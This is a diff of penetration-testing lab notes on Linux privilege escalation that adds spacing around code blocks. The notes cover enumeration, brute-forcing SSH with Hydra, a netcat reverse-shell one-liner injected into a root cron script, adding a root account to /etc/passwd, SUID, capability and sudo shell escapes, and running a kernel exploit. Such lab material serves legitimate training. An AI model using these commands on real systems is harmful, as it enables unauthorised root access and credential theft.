@@ -134,11 +134,13 @@ Directories are handles differently:
  - The ability to cross through a dir without read allows the user to access unknown entries, only by knowing their exact names.
 
 A simple example of these permissions on our local system:
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
 └─$ ls -l /etc/shadow               
 -rw-r----- 1 root shadow 1510 Aug 26 18:13 /etc/shadow
 ```
+
 - For each user category 3 different access perms are displayed.
  - The first `-` indicates file type and can be safely ignored.
 - The next 3 are `root`
@@ -158,15 +160,18 @@ Although time consuming, manual enumeration allows for a more controlled outcome
 Upon initial access, the first thing we should ID is user context:
 - We can use the `id` command.
 	- [id](http://man7.org/linux/man-pages/man1/id.1.html)
+
 ```bash
 joe@debian-privesc:~$ id
 uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
 ```
+
 - The output shows we are user `joe`
 - Has (UID) and (GID) of `1000`
 - We also have group membership outside of our scope.
 
 To enumerate all users, we can read the contents of `/etc/passwd`.
+
 ```bash
 joe@debian-privesc:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -210,6 +215,7 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 eve:x:1001:1001:,,,:/home/eve:/bin/bash
 lightdm:x:118:125:Light Display Manager:/var/lib/lightdm:/bin/false
 ```
+
 - `passwd` lists several user accounts.
  - Including service accounts.
   - Such as `www-data` and `sshd`
@@ -242,10 +248,12 @@ The next item we want to note is the machine's `hostname`, which often provide c
 On most Linux distros, the hostname will be shown in the command prompt, but we should always rely on system commands since the prompt text can be manipulated.
 
 We can use the `hostname` command to retrieve this:
+
 ```bash
 joe@debian-privesc:~$ hostname
 debian-privesc
 ```
+
 - Enterpises often have enforced hostname naming convention schemes for categorizing by location, description, OS, and service level.
 - In our case, the hostname is two parts.
  - OS type.
@@ -260,6 +268,7 @@ To obtain system info we can review:
 - `/etc/issue`
 - `/etc/*-release`
 - Run `uname -a`
+
 ```bash
 joe@debian-privesc:~$ cat /etc/issue && cat /etc/*-release && uname -a
 Debian GNU/Linux 10 \n \l
@@ -275,6 +284,7 @@ SUPPORT_URL="https://www.debian.org/support"
 BUG_REPORT_URL="https://bugs.debian.org/"
 Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64 GNU/Linux
 ```
+
 - `issue` and `os-release` foles in `/etc` contain.
  - OS version.
  - Release-specific info.
@@ -293,6 +303,7 @@ Next we explore running processes and services that may allow PrivEsc.  For this
  - Use flags.
 		- `a` and `x` to list procs with and without a [TTY](https://www.linusakesson.net/programming/tty/)
   - `u` user-readable format.
+
 ```bash
 joe@debian-privesc:~$ ps aux
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
@@ -324,6 +335,7 @@ eve       8926  0.1  0.4  21168  9040 ?        Ss   15:24   0:00 /lib/systemd/sy
 eve       8927  0.0  0.1 170896  2604 ?        S    15:24   0:00 (sd-pam)
 joe       8949  0.0  0.1  10628  3136 pts/0    R+   15:24   0:00 ps aux
 ```
+
 - The output shows several `root` owned services we should research.
 - The `ps` command we ran is also listed in the output owned by our current user.
  - We can filter specific user-owned procs.
@@ -335,6 +347,7 @@ Next we will review the network interfaces, routes, and open ports of the target
 Port bindings can tell us if a running service is only available on a loopback address instead of a routable iface.  A privileged service running on a LO iface could expand our attack surface and increase probability of PrivEsc success.
 
 Depending on the Linux version we can list TCP/IP config of network adapters with `ipconfig` or `ip`, both accept the `a` flag to display all available info.
+
 ```bash
 joe@debian-privesc:~$ ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
@@ -350,9 +363,11 @@ joe@debian-privesc:~$ ip a
     inet 172.16.128.214/24 brd 172.16.128.255 scope global ens224
        valid_lft forever preferred_lft forever
 ```
+
 - Based on this output, we see the system connects to more than one network.
 
 We can display routing tables with `route` or `routel`.
+
 ```bash
 joe@debian-privesc:~$ routel
          target            gateway          source    proto    scope    dev tbl
@@ -375,6 +390,7 @@ We can display active network connections and listening ports with `netstat` or 
 - List all connections `-a`
 - Avoid hostname resolution `-n`
 - List proc name the conn belongs to with `-p`
+
 ```bash
 joe@debian-privesc:~$ ss -anp
 Netid  State      Recv-Q  Send-Q                              Local Address:Port              Peer Address:Port                                                                   
@@ -396,6 +412,7 @@ tcp    TIME-WAIT  0       0                                       127.0.0.1:3603
 tcp    LISTEN     0       128                                          [::]:22                        [::]:*                                                                      
 v_str  ESTAB      0       0                                      2659772525:1023                         0:976
 ```
+
 - Output shows various listening ports and active sessions.
  - Including our SSH session and listening socket.
 
@@ -408,6 +425,7 @@ On Linux, we need root to list firewall rules with IPtables.  Depending on how t
 The `iptables-persistent` Debian package save firewall rules in certain files under `/etc/iptables/` by default and uses them to restore `netfilter` rules at boot time.  These files often have weak perms, allowing a local user to read them.
 
 We can also search for `iptables-save` created files, which dumps the firewall conf to a user specified file.  This file is then used as input to the `iptables-restore` command, restoring firewall rules at next boot.  If an admin has ever run this command, we could search `/etc` or grep the FS for `iptables` commands to locate them.  If the file perms are weak, we can read them to infer firewall rules in use on the system.
+
 ```bash
 joe@debian-privesc:~$ cat /etc/iptables/rules.v4 
 # Generated by xtables-save v1.8.2 on Thu Aug 18 12:53:22 2022
@@ -419,6 +437,7 @@ joe@debian-privesc:~$ cat /etc/iptables/rules.v4
 COMMIT
 # Completed on Thu Aug 18 12:53:22 2022
 ```
+
 - Since the file is RO by users other than root, we can inspect it.
 - Notice the non-default rule explicitly allowing the dest port 1999.
  - This should be noted for further inspection.
@@ -426,6 +445,7 @@ COMMIT
 Next we examine scheduled tasks, commonly leveraged during PrivEsc.  Server systems often execute automated scheduled tasks.  When misconfigured or user created file perms are weak, we can modify the files that will be exec by the scheduling system with high level of priv.
 
 The Linux job scheduler is called `cron`.  Tasks are listed under `/etc/cron.*` dirs, where `*` represents the frequency the task runs at.  For instance, daily tasks will be stored under `/etc/cron.daily`, each script is listed in its own subdir.
+
 ```bash
 joe@debian-privesc:~$ ls -lah /etc/cron*
 -rw-r--r-- 1 root root 1.1K Oct 11  2019 /etc/crontab
@@ -474,13 +494,16 @@ drwxr-xr-x 125 root root  12K Feb 15  2023 ..
 -rwxr-xr-x   1 root root  813 Feb 10  2019 man-db
 -rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
 ```
+
 - We find several daily tasks.
 
 Note that sys admins often add their own sched tasks to `/etc/crontab` and they should be inspected carefully for weak perms.  Most jobs will run as root.  They can be viewed with `crontab -l`.  Running the command with `sudo` will show a root `crontab`.  Always check both user and root crontab.
+
 ```
 # m h  dom mon dow   command
 * * * * * /bin/bash /home/joe/.scripts/user_backups.sh
 ```
+
 - We find a backup job in the root crontab.
  - If the script perms are weak, we can leverage it for PrivEsc.
  - *As we'll learn later in this Module, the joe user has been granted specific sudo permission only to list cron jobs running as the root user. This permission alone cannot be abused to obtain a root shell.*.
@@ -490,6 +513,7 @@ We will at some point need to leverage exploits to achieve PrivEsc.  In this cas
 Manually searching app info can be time consuming, we will learn how to automate this, but we should know how to manually query installed packages as needed.
 
 Linux distros use many different package managers.  Debian based distros use `dpkg` whereas Red Hat uses `rpm`.  To list packages on Debian we ues `dpkg -l`.
+
 ```bash
 joe@debian-privesc:~$ dpkg -l
 Desired=Unknown/Install/Remove/Purge/Hold
@@ -511,6 +535,7 @@ ii  apache2-data                          2.4.38-3+deb10u7                      
 ii  apache2-doc                           2.4.38-3+deb10u7                             al
 ii  apache2-utils                         2.4.38-3+deb10u7                             am
 ```
+
 - This confirms our expectation from enumerating open ports, this machine runs a web server.
  - In this case `Apache2`
 
@@ -523,6 +548,7 @@ It is not feasible to manually check the perms of each file and dir, we must aut
 - `-writable` to specify attribute.
 - `type d` for dirs.
 - `2>/dev/null` to filter errors.
+
 ```bash
 joe@debian-privesc:~$ find / -writable -type d 2>/dev/null
 /run/user/1000
@@ -632,11 +658,13 @@ joe@debian-privesc:~$ find / -writable -type d 2>/dev/null
 /var/tmp
 /usr/share/ppd/custom
 ```
+
 - Several dirs are world writable.
  - Including `/home/joe/.scripts` which contains a cron script.
   - This warrants further investigation.
 
 On most systems drives automatically mount at boot, but we should always look for unmounted drives which may contain valuable info.  If they exist, check the mount perms.  We can use `mount` to list all mounted FS and view `/etc/fstab` to list all drives mounted at boot time.
+
 ```bash
 joe@debian-privesc:~$ cat /etc/fstab 
 # /etc/fstab: static file system information.
@@ -687,10 +715,12 @@ binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
 tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
 tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1001,gid=1001)
 ```
+
 - The output show the swap part and primary ext4 disk.
  - *Keep in mind that the system administrator might have used custom configurations or scripts to mount drives that are not listed in the /etc/fstab file. Because of this, it's good practice to not only scan /etc/fstab, but to also gather information about mounted drives using mount.*.
 
 We can then use `lsblk` to view all disks.
+
 ```bash
 joe@debian-privesc:~$ lsblk
 NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
@@ -700,11 +730,13 @@ sda      8:0    0   32G  0 disk
 └─sda5   8:5    0  975M  0 part [SWAP]
 sr0     11:0    1 1024M  0 rom 
 ```
+
 - Sda consists of 3 parts.
 - Showing info for all disks may reveal parts that are not mounted.
  - Depending on config, we may be able to mount these and search for info.
 
 Another common method is to exploit device drivers and kernel modules, let's examine enumeration techniques.  Enumerate modules loaded on target with `lsmod`.
+
 ```bash
 joe@debian-privesc:~$ lsmod
 Module                  Size  Used by
@@ -766,6 +798,7 @@ button                 20480  0
 ```
 
 Once we list loaded mods and ID interesting ones, we can see more info with `modinfo` (requires full path to run).
+
 ```bash
 joe@debian-privesc:~$ /sbin/modinfo libata
 filename:       /lib/modules/4.19.0-21-amd64/kernel/drivers/ata/libata.ko
@@ -810,6 +843,7 @@ parm:           noacpi:Disable the use of ACPI in probe/suspend/resume (0=off [d
 parm:           allow_tpm:Permit the use of TPM commands (0=off [default], 1=on) (int)
 parm:           atapi_an:Enable ATAPI AN media presence notification (0=0ff [default], 1=on) (int)
 ```
+
 - This info better positions us to find appropriate exploits.
 
 There are a few enumerations to be aware of that may provide a **shortcut to PriveEsc**.  Other than `rwx` file perms there are two *special rights* pertaining to exec files:
@@ -833,6 +867,7 @@ We can use `find` to search for SUID-marked bins:
 - `-type f` for files.
 - `-perm -u=s` with SUID bit set.
 - `2>/dev/null` discard errors.
+
 ```bash
 joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/find
@@ -857,6 +892,7 @@ joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/sbin/pppd
 ```
+
 - We found server SUID bins.
 - Exploitation varies on several factors.
  - If `/bin/cp` were SUID we could copy/overwrite sensitive files like `/etc/passwd`
@@ -869,6 +905,7 @@ A full list of Linux PrivEsc techniques can be found in a compendium by g0tmi1k 
 ##### Automated Enumeration
 
 To obtain an initial baseline of the target, we can use `unix-privesc-check` on UNIX derivatives like Linux.  This is pre installed on Kali and available at `/usr/bin/unix-privesc-check`.  It performs a number of checks to find any sys misconfigs that can be leveraged for PrivEsc.  Run the script without any args to review the tool's details.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
 └─$ /usr/bin/unix-privesc-check              
@@ -894,6 +931,7 @@ condition the GPL v2 applies.
 Search the output for the word 'WARNING'.  If you don't see it then this
 script didn't find any problems.
 ```
+
 - The script has two modes.
 	- `standard`
   - Performs a speed optimized process and should reduce the number of false positives.
@@ -901,11 +939,13 @@ script didn't find any problems.
   - Also checks perms of open file handles and called files.  slow and prone to false positive, but may help to find subtle flaws in 3rd party programs.
 
 In this example we will transfer the script to the target and use `standard` mode, redirect the output to a file called `output.txt`.
+
 ```bash
 joe@debian-privesc:~$ bash unix-privesc-check standard > output.txt
 ```
 
 The script performs numerous checks for permissions on common files.  The following excerpt reveals config files writable by normal users.
+
 ```############################################
 Checking for writable config files
 ############################################
@@ -918,6 +958,7 @@ WARNING: /etc/passwd is a critical config file. World write is set for /etc/pass
 WARNING: /etc/sudoers is a critical config file. World write is set for /etc/sudoers
     Checking if anyone except root can change /etc/shadow
 ```
+
 - The output shows anyone can edit `/etc/passwd`
  - This easily allows an attacker to PrivEsc or create accounts on the target.
 
@@ -944,6 +985,7 @@ On Linux, applications frequently store user-specific config files and sub-dirs 
 One example is the `.bashrc`, which is executed on new terminal windows from existing login sessions or when a new shell instance is started.  Withing the script, env vars can be set when a new user shell is spawned.
 
 Sys admins sometimes store creds in env vars to interact with custom scripts requiring auth.  If we review the env vars of our lab Vm we will notice an unusual env var:
+
 ```bash
 joe@debian-privesc:~$ env
 ...
@@ -964,18 +1006,22 @@ SSH_TTY=/dev/pts/1
 OLDPWD=/home/joe/.cache
 _=/usr/bin/env
 ```
+
 - The `SCRIPT_CREDENTIAL` var holds something resembling a password.
 
 To confirm this is a permanent var, inspect the `.bashrc` conf file.
+
 ```bash
 joe@debian-privesc:~$ cat .bashrc | grep export
 export SCRIPT_CREDENTIALS="lab"
 #export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
 ```
+
 - The var holding the pass is exported when the user shell starts.
 *Storing a clear-text password inside an environment variable is not considered a secure best practice. To safely authenticate with an interactive script, it's recommended to adopt public key authentication and protect private keys with passphrases.*
 
 Let's try to PrivEsc by directly entering the password we discovered.
+
 ```bash
 joe@debian-privesc:~$ su - root
 Password: 
@@ -986,6 +1032,7 @@ root
 Instead of going directly for the root account, we could try to access user `eve` we previously discovered.  We can try building a custom dict from know passwords to attempt to brute force eve's account.
 
 We can generate the wordlist with the `crunch` CLI tool.  Set min and max len to `6` chars, specify pattern with `-t`, then hard code the first 3 chars to `lab`, followed by 3 digits.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
 └─$ crunch 6 6 -t Lab%%% > wordlist  
@@ -1016,6 +1063,7 @@ Since the target runs an SSH server, we can attempt our attack with Hydra.
 - Target IP.
 - Set target as `ssh`
 - Verbose `-V`
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
 └─$ hydra -l eve -P wordlist 192.168.234.214 -t 4 ssh -V             
@@ -1030,6 +1078,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-01 07:19:
 ```
 
 Hydra succeeds and we can login as `eve` via SSH:
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
 └─$ ssh -o PubKeyAuthentication=no eve@192.168.234.214
@@ -1048,6 +1097,7 @@ eve
 ```
 
 We can verify we are running as a priv user with `sudo -l`
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
 └─$ ssh -o PubKeyAuthentication=no eve@192.168.234.214
@@ -1074,6 +1124,7 @@ User eve may run the following commands on debian-privesc:
 ```
 
 Since `eve` is an admin user, we can run commands with elev priv.  We can elevate to root with `sudo -i`
+
 ```bash
 eve@debian-privesc:~$ sudo -i
 root@debian-privesc:~# whoami
@@ -1091,6 +1142,7 @@ System daemons are Linux services, spawned at boot, to perform specific tasks wi
 Sys admins often rely on custom daemons to automate tasks and often neglect security best-practices.  As part of enum, we inspect the behavior of running procs to hunt for anomalies the may lead to PrivEsc.
 
 Unlike Win, Linux sllows us to list info about higher-priv procs like those running in the root context.  We can enum all procs with `ps` , refresh every second with `watch`, and `grep` for the word "pass":
+
 ```bash
 joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
 ...
@@ -1100,6 +1152,7 @@ root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -
 root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
 ...
 ```
+
 - The admin has configured a sys daemon to conn to local sys with the `eve` user creds in clear text.
 - The proc is running as root, but we can still inspect it.
 
@@ -1108,6 +1161,7 @@ Another holistic angle we should consider, is if we have the ability to capture 
 We can run `tcpdump` as user `joe` who has specific sudo perms to run it.  Let's try to capture traffic on the loopback iface:
 - Dump contents in ASCII with `-A`
 - Filter for "pass" with `grep`
+
 ```bash
 joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
 [sudo] password for joe: 
@@ -1116,6 +1170,7 @@ listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
 +...+...user:root,pass:lab -
 +...+...user:root,pass:lab -
 ```
+
 - After several seconds we get the root user pass in clear text!
 
 #### Insecure File Permissions 17.3
@@ -1130,6 +1185,7 @@ Insecure file perms can be leveraged for PrivEsc.  Assume we already gained acce
 To leverage, we must locate an exec file that allows us write access and runs at elev priv.  The cron time based job scheduler is a prime target.  Sys level cron jobs exec with root priv and sys admins often create scripts with insecure perms.
 
 SSH into our example target VM1 as `joe` user and check for installed cron jobs.
+
 ```bash
 joe@debian-privesc:~$ crontab -l
 # Edit this file to introduce tasks to be run by cron.
@@ -1145,10 +1201,12 @@ joe@debian-privesc:~$ grep "CRON" /var/log/syslog
 Nov  1 10:11:46 debian-privesc CRON[1226]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
 Nov  1 10:12:01 debian-privesc CRON[1280]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
 ```
+
 - A script `user_backup.sh` under `/home/joe` is exec in root context.
 - It appears to run every minute.
 
 We can inspect the contents of the script:
+
 ```bash
 joe@debian-privesc:~$ cat .scripts/user_backups.sh 
 #!/bin/bash
@@ -1158,10 +1216,12 @@ cp -rf /home/joe/ /var/backups/joe/
 joe@debian-privesc:~$ ls -lha .scripts/user_backups.sh 
 -rwxrwxrw- 1 root root 50 Aug 25  2022 .scripts/user_backups.sh
 ```
+
 - The script copies the user's home dir to the backups subdir.
 - The perms show local users can write to the file.
 
 Since an unpriv user can modify the contents of the backup script, we can edit and add a reverse shell one-liner.  If it succeeds, we will receive a root priv rev shell on our attacking machine after one minute at most.
+
 ```bash
 joe@debian-privesc:~/.scripts$ cat user_backups.sh 
 #!/bin/bash
@@ -1180,6 +1240,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.182 4444 >/tmp/
 ```
 
 Start the listener on our attacking machine.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
 └─$ nc -nvlp 4444
@@ -1203,6 +1264,7 @@ Previously we have seen that the Debian Vm may be vulnerable to PrivEsc due to `
   - A supported hash for Linux auth.
   - *The output of the OpenSSL passwd command may vary depending on the system executing it. On older systems, it may default to the DES algorithm, while on some newer systems it could output the password in MD5 format.*.
 - We then add the line to `/etc/passwd`
+
 ```bash
 joe@debian-privesc:~$ openssl passwd w00t
 bAoT00dpc4dtE
@@ -1275,6 +1337,7 @@ When a user or a system-automated script launches a proc, it inherits the UID/GU
 User password hashes within `/etc/shadow`, owned by root (uid=0).  How can a non-priv user access the file to change their own password?  To circumvent, the effective UID/GID was introduced, representing the actual value that is checked when performing priv operations.
 
 Let's analyze the `passwd` program, responsible for changing the password for the user who executes it.  On our Debian lab machine, we'll connect as `joe` and execute the `passwd` command without typing anything afterwards (keeping the process in active memory).
+
 ```bash
 joe@debian-privesc:~$ passwd
 Changing password for joe.
@@ -1282,6 +1345,7 @@ Current password:
 ```
 
 Open another shell to further inspect the process.  We can find the PID of the `passwd` proc by listing processes and filtering out the target name.
+
 ```bash
 joe@debian-privesc:~$ ps -u -C passwd
 error: user name does not exist
@@ -1298,10 +1362,12 @@ joe@debian-privesc:~$ ps u -C passwd
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 root      1324  0.0  0.1   9364  2996 pts/0    S+   23:31   0:00 passwd
 ```
+
 - As we see `passwd` is running as the root user.
  - Necessary for it to access and modify `/etc/shadow`
 
 We can also inspect the real UID and effective UID assigned for the proc by inspecting the proc pseudo-filesystem, which allows us to interact with kernel info.  Using the passwd's PID (1324) from previous output, we can inspect the content at `/proc/1932/status` which provides a summary of the process attributes.
+
 ```bash
 joe@debian-privesc:~$ cat /proc/1324/status
 Name:	passwd
@@ -1361,10 +1427,12 @@ nonvoluntary_ctxt_switches:	3
 ```
 
 the `passwd` bin behaves this way because of a special flag called Set-User-ID, SUID for short.
+
 ```bash
 joe@debian-privesc:~$ ls -asl /usr/bin/passwd 
 64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
 ```
+
 - The SUID flag is the `s` in the above output.
  - The flag can be configured with `chmod u+s <fname>`
  - It sets the eUID of the proc to the exec owner UID (root)
@@ -1376,6 +1444,7 @@ A practical example, after completing manual enum, we'll have discovered that th
  - Once the file is found we can have `find` perform an action through the `-exec` param.
 - We want to exec a bash shell along with the [Set Builtin](https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html) `-p` param.
  - Preventing the effective user from being reset.
+
 ```bash
 joe@debian-privesc:~$ find /home/joe/Desktop/ -exec "/usr/bin/bash" -p \;
 bash-5.0# id
@@ -1387,6 +1456,7 @@ bash-5.0# which find
 bash-5.0# ls -asl /usr/bin/find
 312 -rwsr-xr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
 ```
+
 - We observe that the UID still belongs to `joe`
  - The eUID is now `root`
 
@@ -1405,6 +1475,7 @@ Similar to SUID bins, if misconfigued capabilities could allow an attacker to el
 - Recursive search `-r`
 - From root folder `/`
 - Filtering out errors from output.
+
 ```bash
 joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
 /usr/bin/ping = cap_net_raw+ep
@@ -1413,6 +1484,7 @@ joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
 /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
+
 - Two `perl` bins stand out.
  - They have `setuid` capabilities.
  - Effective and permitted `+ep`
@@ -1421,6 +1493,7 @@ joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
 To exploit this miscofig, we could check the GTFOBins website, which provides an organized list of UNIX bins and how they can be misused for PrivEsc.
 - [GTFOBins](https://gtfobins.github.io/)
 We search for "Perl" and find precise instructions on how to exploit the capabilities.  We'll use the command which executes a shell along with POSIX directives enabling setuid.
+
 ```bash
 joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 # id
@@ -1434,6 +1507,7 @@ root
 On UNIX like systems, `sudo` can be used to exec a command with elevated privs.  To use `sudo` our un-priv user must be a member of the sudo group (Debian based distros).  The word sudo stands for "Superuser-Do", think of it as changing the eUID of the executed command.
 
 Custom configs of the sudo-related perms can be applied in the `/etc/sudoers` file.  We can use the `-l` or `--list` option to list the allowed commands for the current user.
+
 ```bash
 joe@debian-privesc:~$ sudo -l
 [sudo] password for joe: 
@@ -1444,11 +1518,13 @@ Matching Defaults entries for joe on debian-privesc:
 User joe may run the following commands on debian-privesc:
     (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
 ```
+
 - We see that `crontab`, `tcpdump`, and `apt-get` are allowing sudo commands.
 
 If the `/etc/sudoers` configs are too permissive user's could abuse to obtain permanent root.
 
 Since the first of the 3 permitted commands does not allow us to edit `crontab` it's unlikely we can use it for PrivEsc.  The second command looks more promising so we browse GTFOBins for suggestions.  Running the command reveals an unexpected outcome.
+
 ```bash
 joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
 dropped privs to root
@@ -1459,19 +1535,23 @@ Maximum file limit reached: 1
 0 packets dropped by kernel
 compress_savefile: execlp(/tmp/tmp.zkRMfxFPP3, /dev/null) failed: Permission denied
 ```
+
 - We are prompted with a "permission denied" error.
 
 To investigate, inspect `syslog` for any occurrence of `tcpdump`
+
 ```bash
 joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
 Nov  2 10:09:07 debian-privesc kernel: [  773.917028] audit: type=1400 audit(1698937747.856:24): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.zkRMfxFPP3" pid=2453 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
 ```
+
 - [audit](https://man7.org/linux/man-pages/man8/auditd.8.html)
  - Audit daemon logged our attempt.
 - [AppArmor](https://apparmor.net/)
  - Was triggered blocking us.
 
 AppArmor is a kernel module providing mandatory access control (MAC) on Linux systems by running app specific profiles, it's enabled by default on Debian 10.  We can verify AppArmor's status as the root user using the `aa-status` command.
+
 ```bash
 joe@debian-privesc:~$ su - root
 Password:
@@ -1502,15 +1582,19 @@ apparmor module is loaded.
 0 processes are in complain mode.
 0 processes are unconfined but have a profile defined.
 ```
+
 - We can see `tcpdump` is protected with an AppArmor profile.
 
 The first two sudoers commands did not work, we check the third command `apt-get`.
+
 ```bash
 sudo apt-get changelog apt
 !/bin/sh
 ```
+
 - Runs the `apt-get` changelog command.
  - Invoking `less` app from which we exec a bash shell.
+
 ```bash
 joe@debian-privesc:~$ sudo apt-get changelog apt
 Get:1 store: apt 1.8.2.3 Changelog
@@ -1525,12 +1609,14 @@ uid=0(root) gid=0(root) groups=0(root)
 Depending on the OS and kernel version, another excellent way to achieve PrivEsc are kernel exploits.
 
 To demonstrate this vectore we must first gather info about the target by inspecting the `/etc/issue` file,  As we learned earlier, this file contains text and system ID into that is printed to the login prompt on Linux machines.
+
 ```bash
 joe@ubuntu-privesc:~$ cat /etc/issue
 Ubuntu 16.04.4 LTS \n \l
 ```
 
 We must next inspect the kernel version and get the sys arch.
+
 ```bash
 joe@ubuntu-privesc:~$ uname -r
 4.4.0-116-generic
@@ -1542,6 +1628,7 @@ The target sys appears to be running Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generi
 - Main keyword `linux kernel Ubuntu 16 Local Privilege Escalation`
 - Exclude anything below kernel version 4.4.0.
 - Exclude anything matching kernel version 4.9.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
 └─$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
@@ -1565,12 +1652,14 @@ Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'C | linux/local/14814.c
 Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson. | linux/local/17787.c
 Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Loc | linux/local/45010.c
 ```
+
 - We will try the last exploit `linux/local/45010.c` since it is newer and matches our kernel version.
 - It also targets any kernel version below 4.13.9.
 
 We use `gcc` on Linux to compile our exploit, matching the arch of our target.  This is imperative when the target does not have a compiler and we are forced to compile locally or in a sandbox env replicating the target.
 
 Learning every detail of a Linux kernel exploit is beyond the scope of this module, we need to know how to compile the code.  First we will copy the exploit to our working dir and inspect the first lines for compilation instructions.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
 └─$ head -n 20 45010.c
@@ -1602,31 +1691,38 @@ Learning every detail of a Linux kernel exploit is beyond the scope of this modu
 └─$ ls          
 45010.c  cve-2017-16995
 ```
+
 - To assure compilation works as expected and if the target has GCC.
  - We can compile on target.
 - This assures the correct libs are used for the target arch.
 - Lowers the risks of cross compatibility issues.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
 └─$ scp -o PubKeyAuthentication=no 45010.c joe@192.168.216.216:~/
 joe@192.168.216.216's password: 
 45010.c
 ```
+
 - On target.
+
 ```bash
 joe@ubuntu-privesc:~$ gcc 45010.c -o cve-2017-16995
 joe@ubuntu-privesc:~$ ls
 45010.c  cve-2017-16995
 ```
+
 - We can safely assume GCC compile it correctly as it output no errors.
 
 We can inspect the Linux ELF file arch with `file`
+
 ```bash
 joe@ubuntu-privesc:~$ file cve-2017-16995 
 cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dd15fe9ed0b8bc7da0ee0d0dc643a5cb29f83bf1, not stripped
 ```
 
 We are now ready to run our kernel exploit!
+
 ```bash
 joe@ubuntu-privesc:~$ ./cve-2017-16995 
 [.] 
@@ -1650,4 +1746,5 @@ uid=0(root) gid=0(root) groups=0(root),1001(joe)
 # whoami
 root
 ```
+
 - We have successfully obtained a root shell by exploiting a known kernel vuln.
